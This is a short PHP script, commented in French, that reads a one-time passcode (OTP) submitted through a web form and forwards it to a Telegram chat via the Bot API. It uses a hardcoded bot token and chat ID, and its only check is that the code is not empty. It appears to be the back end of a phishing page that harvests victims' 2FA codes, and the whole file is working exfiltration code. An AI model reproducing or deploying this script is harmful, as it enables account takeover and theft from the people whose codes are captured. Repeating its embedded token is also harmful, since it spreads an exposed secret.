<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Récupérer le code OTP depuis le formulaire
    $otp = $_POST['otp'];

    // Vérifier si le champ est rempli
    if (empty($otp)) {
        die('Erreur : Aucun code OTP reçu.');
    }

    // Configuration de Telegram
    $botToken = "7190313520:AAGyP3BC0HqZjisZh_HbUXcwQohHOUjvyfU"; // Remplacez par votre token de bot
    $chatID = "8134069302"; // Remplacez par l'ID de votre chat
    $message = "Un nouvel utilisateur a envoyé ce code OTP : $otp";

    // URL de l'API Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Paramètres pour l'envoi de la requête
    $postData = [
        'chat_id' => $chatID,
        'text' => $message
    ];

    // Initialisation de cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Exécution de la requête
    $response = curl_exec($ch);

    // Vérifier si la requête a échoué
    if ($response === false) {
        die('Erreur lors de l\'envoi des données à Telegram.');
    }

    // Fermer cURL
    curl_close($ch);

    // Rediriger ou afficher un message de confirmation
    echo 'Le code OTP a été envoyé avec succès à Telegram.';
}
?>
